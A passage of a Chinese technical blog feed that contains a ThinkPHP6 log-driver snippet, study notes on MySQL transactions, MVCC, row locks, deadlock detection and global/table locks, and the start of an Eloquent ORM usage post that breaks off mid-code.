检查日志文件大小并自动生成备份文件</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> protected</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $destination 日志文件</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">checkLogSize</span><span class="params">(string $destination)</span>: <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_file($destination) &amp;&amp; floor(<span class="keyword">$this</span>-&gt;config[<span class="string">'file_size'</span>]) &lt;= filesize($destination)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                rename($destination, dirname($destination) . DIRECTORY_SEPARATOR . time() . <span class="string">'-'</span> . basename($destination));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">                <span class="comment">//</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后将 <code>config/log.php</code> 配置中的 type 设置为 <code>Tp6Log::class</code> ，便可以将请求记录、SQL 执行记录、错误等信息统统记录到日志文件中。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://blog.csdn.net/Function_JX_/article/details/121261012" target="_blank" rel="noopener">thinkphp6自定义日志驱动,增加显示全部请求信息</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> ThinkPHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>08 事务到底是隔离的还是不隔离的</title>
      <link href="/is-the-transaction-isolated-or-not/"/>
      <url>/is-the-transaction-isolated-or-not/</url>
      
        <content type="html"><![CDATA[<p>本文是基于 <a href="https://time.geekbang.org/column/intro/100020801" target="_blank" rel="noopener">极客时间——MySQL 实战 45 讲</a> 整理的学习笔记，仅供学习参考，请勿用于商业用途，如若侵权，请联系并删除。</p><p>课程重点：</p><ul><li>了解 Mysql 的全局锁</li><li>了解当前读的概念</li></ul><a id="more"></a><p>下面是一个只有两行的表的初始化语句。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE &#96;t&#96; (</span><br><span class="line">  &#96;id&#96; int(11) NOT NULL,</span><br><span class="line">  &#96;k&#96; int(11) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (&#96;id&#96;)</span><br><span class="line">) ENGINE&#x3D;InnoDB;</span><br><span class="line"></span><br><span class="line">insert into t(id, k) values(1,1),(2,2);</span><br></pre></td></tr></table></figure><p><img src="inkdrop://file:ZJBcivXF4" alt="clipboard.png"><br>在如图所示的事务启动时机下，最终事务 B 查到的 k 的值是 3，而事务 A 查到的 k 的值是 1。</p><p>在 MySQL 里，有两个“视图”的概念：</p><ul><li>一个是 view。它是一个用查询语句定义的虚拟表，在调用的时候执行查询语句并生成结果。创建视图的语法是 create view … ，而它的查询方法与表一样。</li><li>另一个是 InnoDB 在实现 MVCC 时用到的一致性读视图，即 consistent read view，用于支持 RC（Read Committed，读提交）和 RR（Repeatable Read，可重复读）隔离级别的实现。</li></ul><p>一致性读视图它没有物理结构，作用是事务执行期间用来定义“我能看到什么数据”。</p><h2 id="“快照”在-MVCC-里是怎么工作的？"><a href="#“快照”在-MVCC-里是怎么工作的？" class="headerlink" title="“快照”在 MVCC 里是怎么工作的？"></a>“快照”在 MVCC 里是怎么工作的？</h2><p>InnoDB 里面每个事务有一个唯一的事务 ID，叫作 transaction id。它是在事务开始的时候向 InnoDB 的事务系统申请的，是按申请顺序严格递增的。</p><p>数据表中的一行记录，其实可能有多个版本 (row)，每个版本有自己的 row trx_id。</p><p>按照可重复读的定义，一个事务启动的时候，能够看到所有已经提交的事务结果。但是之后，这个事务执行期间，其他事务的更新对它不可见。</p><p>因此，一个事务只需要在启动的时候声明说：</p><ul><li>以我启动的时刻为准，如果一个数据版本是在我启动之前生成的，就认。</li><li>如果是我启动以后才生成的，我就不认，我必须要找到它的上一个版本。</li></ul><p>当然，如果“上一个版本”也不可见，那就得继续往前找。还有，如果是这个事务自己更新的数据，它自己还是要认的。</p><p>在实现上， InnoDB 为每个事务构造了一个数组，用来保存这个事务启动瞬间，当前正在“活跃”的所有事务 ID。“活跃”指的就是，启动了但还没提交。</p><p>数组里面事务 ID 的最小值记为低水位，当前系统里面已经创建过的事务 ID 的最大值加 1 记为高水位。</p><p><strong>这个视图数组和高水位，就组成了当前事务的一致性视图（read-view）</strong>。</p><p>数据型版本的可见性规则（基于数据的 row trx_id 和这个一致性视图的对比结果得到）：</p><p><img src="inkdrop://file:2CGAB0Q69" alt="clipboard.png"></p><p>这样，对于当前事务的启动瞬间来说，一个数据版本的 row trx_id，有以下几种可能：</p><p>如果落在绿色部分，表示这个版本是已提交的事务或者是当前事务自己生成的，这个数据是可见的；<br>如果落在红色部分，表示这个版本是由将来启动的事务生成的，是肯定不可见的；<br>如果落在黄色部分，那就包括两种情况<br>a. 若 row trx_id 在数组中，表示这个版本是由还没提交的事务生成的，不可见；<br>b. 若 row trx_id 不在数组中，表示这个版本是已经提交了的事务生成的，可见。</p><p><img src="inkdrop://file:vyobdNYum" alt="clipboard.png"><br>接下来，我们继续看一下图 1 中的三个事务，分析下事务 A 的语句返回的结果，为什么是 k=1。</p><p>这里，我们不妨做如下假设：</p><ul><li>事务 A 开始前，系统里面只有一个活跃事务 ID 是 99；</li><li>事务 A、B、C 的版本号分别是 100、101、102，且当前系统里只有这四个事务；</li><li>三个事务开始前，(1,1）这一行数据的 row trx_id 是 90。</li></ul><p>这样，事务 A 的视图数组就是 [99,100], 事务 B 的视图数组是 [99,100,101], 事务 C 的视图数组是 [99,100,101,102]。</p><p>为了简化分析，先把其他干扰语句去掉，只画出跟事务 A 查询逻辑有关的操作：</p><p><img src="inkdrop://file:lZOIMF8MF" alt="clipboard.png"></p><p>一个数据版本，对于一个事务视图来说，除了自己的更新总是可见以外，有以下三种情况：</p><ol><li>版本未提交，不可见</li><li>版本已提交，但是是在视图创建后提交的，不可见</li><li>版本已提交，而且是在视图创建前提交的，可见</li></ol><p>有了这个规则之后，可以尝试判断事务 A 的查询语句的查询过程：</p><ol><li>(1,3) 当前版本还未提交，属于情况 1，不可见</li><li>(1,2) 历史版本已经提交，但是是在视图数组创建之后提交的，属于情况 2，不可见</li><li>(1,1) 是在视图数组创建之前提交的，可见</li></ol><h2 id="更新逻辑"><a href="#更新逻辑" class="headerlink" title="更新逻辑"></a>更新逻辑</h2><p>按照上面的逻辑，那事务 B 的值应该是 2 才对，可最后怎么又变成了 3 呢？</p><p>是的，如果事务 B 在更新之前查询一次数据，这个查询返回的 k 的值确实是 1。</p><p>但是，当它要去更新数据的时候，就不能再在历史版本上更新了，否则事务 C 的更新就丢失了。因此，事务 B 此时的 set k=k+1 是在（1,2）的基础上进行的操作。</p><p>所以，这里就用到了这样一条规则：<strong>更新数据都是先读后写的，而这个读，只能读当前的值，称为“当前读”（current read）</strong>。</p><p>因此，在更新的时候，当前读拿到的数据是 (1,2)，更新后生成了新版本的数据 (1,3)，这个新版本的 row trx_id 是 101。</p><p>所以，在执行事务 B 查询语句的时候，一看自己的版本号是 101，最新数据的版本号也是 101，是自己的更新，可以直接使用，所以查询得到的 k 的值是 3。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>在可重复读隔离级别下，事务启动时，会创建一个一致性视图 read-view</li><li><code>begin/start transaction</code> 命令并不是一个事务的起点，在执行到它们之后的第一个操作 InnoDB 表的语句，事务才真正启动。</li><li>在 <code>autocommit=1</code> 时，直接执行一个 update 语句，表示这个 update 语句本身就是一个事务，语句完成的时候会自动提交事务。</li><li>每次事务更新数据时，都会生成一个新的数据版本，并且把 transaction id（唯一的事务 ID） 赋值给这个数据版本的事务 ID，记为 row trx_id。</li></ol>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>07 行锁功过:怎么减少行锁对性能的影响</title>
      <link href="/row-lock-merits-and-demerits-how-to-reduce-the-impact-of-row-locks-on-performance/"/>
      <url>/row-lock-merits-and-demerits-how-to-reduce-the-impact-of-row-locks-on-performance/</url>
      
        <content type="html"><![CDATA[<p>本文是基于 <a href="https://time.geekbang.org/column/intro/100020801" target="_blank" rel="noopener">极客时间——MySQL 实战 45 讲</a> 整理的学习笔记，仅供学习参考，请勿用于商业用途，如若侵权，请联系并删除。</p><p>课程重点：</p><ul><li>了解 Mysql 的行锁</li><li>理解两阶段锁协议</li><li>了解死锁及死锁检测</li></ul><a id="more"></a><p>MySQL 的行锁是在引擎层由各个引擎自己实现的。但并不是所有的引擎都支持行锁，比如 MyISAM 引擎就不支持行锁。</p><p>不支持行锁意味着并发控制只能使用表锁，对于这种引擎的表，同一张表上任何时刻只能有一个更新在执行，这就会影响到业务并发度。InnoDB 是支持行锁的，这也是 MyISAM 被 InnoDB 替代的重要原因之一。</p><p>顾名思义，行锁就是针对数据表中行记录的锁。这很好理解，比如事务 A 更新了一行，而 这时候事务 B 也要更新同一行，则必须等事务 A 的操作完成后才能进行更新。</p><p>当然，数据库中还有一些没那么一目了然的概念和设计，这些概念如果理解和使用不当，容<br>易导致程序出现非预期行为，比如两阶段锁。</p><h2 id="两阶段锁协议"><a href="#两阶段锁协议" class="headerlink" title="两阶段锁协议"></a>两阶段锁协议</h2><p>在下面的操作序列中，事务 B 的 update 语句执行时会是什么现象呢？假设字段 id 是表 t 的主键。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220613215803.png" alt=""></p><p>这个问题的结论取决于事务 A 在执行完两条 update 语句后，持有哪些锁，以及在什么时 候释放。你可以验证一下:实际上事务 B 的 update 语句会被阻塞，直到事务 A 执行 commit 之后，事务 B 才能继续执行。</p><p>知道了这个答案，你一定知道了事务 A 持有的两个记录的行锁，都是在 commit 的时候才释放的。</p><p>也就是说，<strong>在 InnoDB 事务中，行锁是在需要的时候才加上的，但并不是不需要了就立刻释放，而是要等到事务结束时才释放（这一点和 MDL 很像）。这个就是两阶段锁协议</strong>。</p><p>知道了两阶段锁协议的设定，对我们使用事务有什么帮助呢？</p><p>那就是，<strong>如果事务中需要锁多个行，要把最可能造成锁冲突、最可能影响并发度的锁尽量往后放</strong>。</p><p>假设在一个业务中，需要 update 两条记录（1、2），并 insert 一条记录（3），为了保证原子性，我们要把这三个操作放在一个事务中。</p><p>其中有一个 update 语句会冲突，需要修改同一行数据。</p><p>根据两阶段锁协议，不论你怎样安排语句顺序，所有的操作需要的行锁都是在事务提交的时候才释放的。所以，如果你把语句 2 安排在最后，比如按照 3、1、2 这样的顺序，那么行锁时间就最少。这就最大程度地减少了事务之间的锁等待，提升了并发度。</p><p>好了，现在由于你的正确设计，影院余额这一行的行锁在一个事务中不会停留很长时间。但<br>是，这并没有完全解决你的困扰。<br>如果这个影院做活动，可以低价预售一年内所有的电影票，而且这个活动只做一天。于是在 活动时间开始的时候，你的 MySQL 就挂了。你登上服务器一看，CPU 消耗接近 100%， 但整个数据库每秒就执行不到 100 个事务。这是什么原因呢?<br>这里，我就要说到死锁和死锁检测了。<br>死锁和死锁检测<br>当并发系统中不同线程出现循环资源依赖，涉及的线程都在等待别的线程释放资源时，就会<br>导致这几个线程都进入无限等待的状态，称为死锁。这里我用数据库中的行锁举个例子。</p><h2 id="死锁和死锁检测"><a href="#死锁和死锁检测" class="headerlink" title="死锁和死锁检测"></a>死锁和死锁检测</h2><p>当并发系统中不同线程出现循环资源依赖，涉及的线程都在等待别的线程释放资源时，就会<br>导致这几个线程都进入无限等待的状态，称为死锁。</p><p>下面通过数据库的行锁来解释什么是死锁。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220613215825.png" alt=""><br>如上图所示，事务 A 在等待事务 B 释放 id=2 的行锁，而事务 B 在等待事务 A 释放 id=1 的行锁。 事务 A 和事务 B 在互相等待对方的资源释放，此时就会进入死锁的状态。</p><p>当出现死锁以后，有两种策略:</p><ol><li>直接进入等待，直到超时。这个超时时间可以通过参数 <code>innodb_lock_wait_timeout</code> 来设置。</li><li>发起死锁检测，发现死锁后，主动回滚死锁链条中的某一个事务，让其他事务得以继续执行。将参数 <code>innodb_deadlock_detect</code> 设置为 on，表示开启这个逻辑</li></ol><p>在 InnoDB 中，<code>innodb_lock_wait_timeout</code> 的默认值是 50s，意味着如果采用第一个策略，当出现死锁以后，第一个被锁住的线程要过 50s 才会超时退出，然后其他线程才有可能继续执行。对于在线服务来说，这个等待时间往往是无法接受的。</p><p>但是，我们又不可能直接把这个时间设置成一个很小的值，比如 1s。这样当出现死锁的时候，确实很快就可以解开，但如果不是死锁，而是简单的锁等待呢？所以，超时时间设置太短的话，会出现很多误伤。</p><p>正常情况下还是要采用第二种策略，即:主动死锁检测，而且 <code>innodb_deadlock_detect</code> 的默认值本身就是 on。主动死锁检测在发生死锁的时候，是能够快速发现并进行处理的，但是它也是有额外负担的。</p><p>因为每当一个事务被锁时，就需要看看它所依赖的线程有没有被别人锁住，如此循环，最后判断是否出现了循环等待，也就是死锁。</p><p>特别是当是当所有事务都要更新同一行的场景下（也就是并发比较大），每个新来的被堵住的线程，都要判断会不会由于自己的加入导致了死锁，这是一个时间复杂 度是 O(n) 的操作。假设有 1000 个并发线程要同时更新同一行，那么死锁检测操作就是 100 万这个量级的。虽然最终检测的结果是没有死锁，但是这期间要消耗大量的 CPU 资源。因此，你就会看到 CPU 利用率很高，但是每秒却执行不了几个事务。</p><p>那么到底该如何解决由这种热点行更新，导致的性能问题呢？</p><p>问题的症结在于，死锁检测要耗费大量的 CPU 资源，这里有两种方案：</p><ol><li><strong>一种头痛医头的方法，就是如果你能确保这个业务一定不会出现死锁，可以临时把死锁检测关掉</strong>。但是这种操作本身带有一定的风险，因为业务设计的时候一般不会把死锁当做一个严 重错误，毕竟出现死锁了，就回滚，然后通过业务重试一般就没问题了，这是业务无损的。 而关掉死锁检测意味着可能会出现大量的超时，这是业务有损的。</li><li>另一个思路是控制并发度。根据上面的分析，你会发现如果并发能够控制住，比如同一行同 时最多只有 10 个线程在更新，那么死锁检测的成本很低，就不会出现这个问题。一个直接 的想法就是，在客户端做并发控制。但是，你会很快发现这个方法不太可行，因为客户端很 多。我见过一个应用，有 600 个客户端，这样即使每个客户端控制到只有 5 个并发线程， 汇总到数据库服务端以后，峰值并发数也可能要达到 3000。</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>在 InnoDB 事务中，行锁是在需要的时候才加上的，但并不是不需要了就立刻释放，而是要等到事务结束时才释放。这个就是两阶段锁协议。</li><li>当事务中需要锁多个行，要把最可能造成锁冲突、最可能影响并发度的锁的申请时机尽量往后放，这样可以最大程度的减少事务之间的锁等待。</li><li>调整语句的执行顺序并不能完全避免死锁，因此引入了死锁和死锁检测的概念。减少死锁的思路是，控制相同资源的并发事务量。</li><li>死锁检测只会发生在当一个事务被锁的时候，就要看看它所依赖的线程有没有被别人锁住，并不是任何一个事务启动就会做死锁检测。</li><li>InnoDB update 如果没有走索引，InnoDB 内部是权标根据主键索引逐行扫描，逐行加锁，事务提交时统一释放。</li></ol>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>06 全局锁和表锁：给表加个字段怎么有这么多阻碍</title>
      <link href="/global-lock-and-table-lock-how-can-there-be-so-many-obstacles-to-adding-a-field-to-a-table/"/>
      <url>/global-lock-and-table-lock-how-can-there-be-so-many-obstacles-to-adding-a-field-to-a-table/</url>
      
        <content type="html"><![CDATA[<p>本文是基于 <a href="https://time.geekbang.org/column/intro/100020801" target="_blank" rel="noopener">极客时间——MySQL 实战 45 讲</a> 整理的学习笔记，仅供学习参考，请勿用于商业用途，如若侵权，请联系并删除。</p><p>课程重点：</p><ul><li>了解 Mysql 全局锁</li><li>了解 Mysql 表级锁</li><li>为什么给小表增加字段也会导致表锁</li></ul><a id="more"></a><h2 id="全局锁"><a href="#全局锁" class="headerlink" title="全局锁"></a>全局锁</h2><p>顾名思义，全局锁就是对整个数据库实例加锁。MySQL 提供了一个加全局读锁的方法，命令是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; Flush tables with read lock (FTWRL)</span><br></pre></td></tr></table></figure><p>当你需要让整个库处于只读状态的时候，可 以使用这个命令，之后其他线程的以下语句会被阻塞:数据更新语句(数据的增删改)、数 据定义语句(包括建表、修改表结构等)和更新类事务的提交语句。</p><p><strong>全局锁的典型使用场景是，做全库逻辑备份</strong>。也就是把整库每个表都 select 出来存成文本。</p><blockquote><p>为什么备份需要加锁呢？</p></blockquote><p>不加锁的话，备份系统备份的得到的库不是一个逻辑时间点，这个视图是逻辑不一致的。</p><p>官方自带的逻辑备份工具是 mysqldump。当 mysqldump 使用参数–single-transaction 的时候，导数据之前就会启动一个事务，来确保拿到一致性视图。而由于 MVCC 的支持， 这个过程中数据是可以正常更新的。</p><p>你一定在疑惑，有了这个功能，为什么还需要 FTWRL 呢?一致性读是好，但前提是引擎要 支持这个隔离级别。比如，对于 MyISAM 这种不支持事务的引擎，如果备份过程中有更 新，总是只能取到最新的数据，那么就破坏了备份的一致性。这时，我们就需要使用 FTWRL 命令了。</p><p>所以，single-transaction 方法只适用于所有的表使用事务引擎的库。如果有的表使用了 不支持事务的引擎，那么备份就只能通过 FTWRL 方法。这往往是 DBA 要求业务开发人员 使用 InnoDB 替代 MyISAM 的原因之一。</p><p>你也许会问，既然要全库只读，为什么不使用 set global readonly=true 的方式呢?确 实 readonly 方式也可以让全库进入只读状态，但我还是会建议你用 FTWRL 方式，主要有 两个原因:</p><ul><li>一是，在有些系统中，readonly 的值会被用来做其他逻辑，比如用来判断一个库是主库 还是备库。因此，修改 global 变量的方式影响面更大，我不建议你使用。</li><li>二是，在异常处理机制上有差异。如果执行 FTWRL 命令之后由于客户端发生异常断开， 那么 MySQL 会自动释放这个全局锁，整个库回到可以正常更新的状态。而将整个库设 置为 readonly 之后，如果客户端发生异常，则数据库就会一直保持 readonly 状态，这 样会导致整个库长时间处于不可写状态，风险较高。</li></ul><p>业务的更新不只是增删改数据(DML)，还有可能是加字段等修改表结构的操作(DDL)。 不论是哪种方法，一个库被全局锁上以后，你要对里面任何一个表做加字段操作，都是会被 锁住的。</p><h2 id="表级锁"><a href="#表级锁" class="headerlink" title="表级锁"></a>表级锁</h2><p>MySQL 里面表级别的锁有两种:一种是表锁，一种是元数据锁(meta data lock， MDL)。</p><p>表锁的语法是 <strong>lock tables … read/write</strong>。与 FTWRL 类似，可以用 unlock tables 主动 释放锁，也可以在客户端断开的时候自动释放。需要注意，lock tables 语法除了会限制别 的线程的读写外，也限定了本线程接下来的操作对象。</p><p>举个例子, 如果在某个线程 A 中执行 lock tables t1 read, t2 write; 这个语句，则其他线程 写 t1、读写 t2 的语句都会被阻塞。同时，线程 A 在执行 unlock tables 之前，也只能执 行读 t1、读写 t2 的操作。连写 t1 都不允许，自然也不能访问其他表。</p><p>在还没有出现更细粒度的锁的时候，表锁是最常用的处理并发的方式。而对于 InnoDB 这 种支持行锁的引擎，一般不使用 lock tables 命令来控制并发，毕竟锁住整个表的影响面还 是太大。</p><hr><p><strong>另一类表级的锁是 MDL(metadata lock)</strong>。MDL 不需要显式使用，在访问一个表的时候 会被自动加上。MDL 的作用是，保证读写的正确性。你可以想象一下，如果一个查询正在 遍历一个表中的数据，而执行期间另一个线程对这个表结构做变更，删了一列，那么查询线 程拿到的结果跟表结构对不上，肯定是不行的。</p><p>MDL 是MySQL 5.5版本引入的，当对一个表做增删改查操作的时候，加 MDL 读锁;当要对表做结构变更操作的时候，加 MDL 写锁。</p><ul><li>读锁之间不互斥，因此你可以有多个线程同时对一张表增删改查。</li><li>读写锁、写锁之间是互斥的，用来保证变更表结构操作的安全性。也就是说，如果有两个<br>线程要同时给一个表加字段或者分别进行增删改查和加字段，那么其中一个要等另一个执行完才能开始执行。</li></ul><p>Mysql 5.6 之后，支持Online DDL，也就是不会堵塞增删改查。</p><p>Online DDL的过程是这样的: </p><ol><li>拿MDL写锁</li><li>降级成MDL读锁</li><li>真正做DDL</li><li>升级成MDL写锁</li><li>释放MDL锁</li></ol><p>下面通过一个示例来说明，为什么有时候给小表增加字段也可能会导致整个表被锁住。</p><p>这里的实验环境是 MySQL 5.7。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220612095232.png" alt=""></p><p>从上图可以看到 session A 先启动，这时候会对表 t 加一个 MDL 读锁。由于 session B 需要 的也是 MDL 读锁，因此可以正常执行。</p><p>需要注意的是，此时 session A 开启了事务，但是并没有释放。</p><p>之后 session C 会被 blocked，是因为 session A 的 MDL 读锁还没有释放，而 session C 需要 MDL 写锁，因此只能被阻塞（阻塞原因就是前面提到的，MDL 读写锁是互斥的）。</p><p>如果只有 session C 自己被阻塞还没什么关系，但是之后所有要在表 t 上新申请 MDL 读锁的请求也会被 session C 阻塞。前面我们说了，所有对表的增删改查操作都需要先申请 MDL 读锁，就都被锁住，等于<br>这个表现在完全不可读写了。</p><p>如果某个表上的查询语句频繁，而且客户端有重试机制，也就是说超时后会再起一个新 session 再请求的话，这个库的线程很快就会爆满。</p><p>事务中的 MDL 锁，在语句执行开始时申请，但是语句结束后并不会马上释放，<strong>MDL 需要等到整个事务提交后再释放</strong>。</p><blockquote><p>那么如何安全的给小表加字段呢？</p></blockquote><ul><li>非热点表：解决长事务、慢查询占着 MDL 锁不释放的问题</li><li>热点表：在 alter table 语句里面设定等待时间</li></ul><p>所以在做 DDL 操作之前，最好看一下是否有大事务的提交，或者慢查询存在，尽量避免与这些同时执行。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>备份整库时，需要加全局锁。有两种方式：FTWRL 和 mysqldump 的 -single-transaction。一个库被全局锁上以后，要对里面任何一个表做加字段操作，都是会被锁住的。</li><li>表级锁有两种：表锁和 MDL。前者需要显式使用，后者则不需要，是系统默认加的。</li><li><code>update table set is_enable = 1</code> 这个 SQL 语句，获取的还是行锁，只是是这个表的所有行。</li><li>Mysql 5.6 以后支持 Online DDL，也就是对表做 DDL 操作，不会阻塞增删改查。</li><li>不过做 DDL 操作之前，还是要看一下是否有长事务未提交，否则 DDL 操作会被阻塞。</li></ol>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Eloquent ORM 常见使用场景整理</title>
      <link href="/common-usage-scenarios-of-eloquent-orm/"/>
      <url>/common-usage-scenarios-of-eloquent-orm/</url>
      
        <content type="html"><![CDATA[<p>以下实例，都是基于 Eloquent ORM，可以直接在 Laravel 下直接使用。</p><a id="more"></a><h2 id="场景一"><a href="#场景一" class="headerlink" title="场景一"></a>场景一</h2><p>用户表增加了一个字段，因为项目中有许多指定部分列的查询，现在希望项目中所有查询用户信息的地方都可以自动加上这个字段。</p><p>解决方案：重写用户模型 booted 方法，并闭包自定义全局查询作用域。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">booted</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span>::addGlobalScope(<span class="string">"uid"</span>, <span class="function"><span class="keyword">function</span> <span class="params">(Builder $builder)</span> </span>&#123;</span><br><span class="line">        $columns = $builder-&gt;getQuery()-&gt;columns;</span><br><span class="line">        <span class="keyword">if</span> (!is_null($columns)) &#123;</span><br><span class="line">            $builder-&gt;addSelect([<span class="string">"is_vip"</span>,]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，当执行以下查询时，生成 SQL 如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$user = UserModel::select([<span class="string">"uid"</span>, <span class="string">"nickname"</span>])-&gt;find(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// select `uid`, `nickname`, `is_vip` from `user` where `user`.`uid` = '1' limit 1</span></span><br></pre></td></tr></table></figure><h2 id="场景二"><a href="#场景二" class="headerlink" title="场景二"></a>场景二</h2><p>一对多关联（用户表与文章表）：如何获最新一条记录或统计关联数据的合计。</p><p>以用户与文章之间的一对多关联为例，如果用户列表需要返回用户发布最新文章的标题，那么该如何进行查询？</p><p>这个场景下使用连接查询是不行的，因为涉及到被驱动表的排序和限定查询问题。</p><p>思路：基于子查询结合关联模型进行查询。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $users = User::addSelect([</span><br><span class="line">        <span class="string">'last_post_title'</span> =&gt; Post::select([<span class="string">'title'</span>])</span><br><span class="line">            -&gt;whereColumn(<span class="string">'uid'</span>, <span class="string">'users.uid'</span>)</span><br><span class="line">            -&gt;orderByDesc(<span class="string">'created_at'</span>)</span><br><span class="line">            -&gt;limit(<span class="number">1</span>)</span><br><span class="line">    ])</span><br><span class="line">      -&gt;orderByDesc(<span class="string">'uid'</span>)</span><br><span class="line">      -&gt;get();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成 SQL 如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> (<span class="keyword">select</span> title <span class="keyword">from</span> <span class="string">`posts`</span> <span class="keyword">where</span> <span class="string">`uid`</span> = <span class="string">`user`</span>.<span class="string">`uid`</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="string">`created_at`</span> <span class="keyword">desc</span> <span class="keyword">limit</span> <span class="number">1</span> ) <span class="keyword">as</span> <span class="string">`last_post_title`</span>,<span class="string">`user`</span>.*  <span class="keyword">from</span> <span class="string">`user`</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="string">`uid`</span> <span class="keyword">desc</span> ;</span><br></pre></td></tr></table></figure><p>对某个字段进行合计也是一样的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">UserModel::addSelect([</span><br><span class="line">      <span class="string">"amount"</span> =&gt; OrderModel::selectRaw(<span class="string">'sum(total_price)'</span>)</span><br><span class="line">            -&gt;whereColumn(<span class="string">'uid'</span>, <span class="string">'user.uid'</span>)</span><br><span class="line">            -&gt;orderByDesc(<span class="string">"total_price"</span>)</span><br><span class="line">            -&gt;limit(<span class="number">1</span>)</span><br><span class="line">    ])</span><br><span class="line">      -&gt;orderByDesc(<span class="string">"amount"</span>)</span><br><span class="line">      -&gt;get();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成 SQL 如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> (<span class="keyword">select</span> <span class="keyword">SUM</span>(total_price) <span class="keyword">from</span> <span class="string">`order`</span> <span class="keyword">where</span> <span class="string">`uid`</span> = <span class="string">`user`</span>.<span class="string">`uid`</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="string">`total_price`</span> <span class="keyword">desc</span> <span class="keyword">limit</span> <span class="number">1</span> ) <span class="keyword">as</span> <span class="string">`amount`</span>,<span class="string">`user`</span>.* <span class="keyword">from</span> <span class="string">`user`</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="string">`amount`</span> <span class="keyword">desc</span> ;</span><br></pre></td></tr></table></figure><h2 id="场景三"><a href="#场景三" class="headerlink" title="场景三"></a>场景三</h2><p>聚合统计：统计订单表中不同状态下的订单数量。</p><p>思路一：对订单状态进行分组，然后通过代码逻辑统计不同状态下订单数量。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 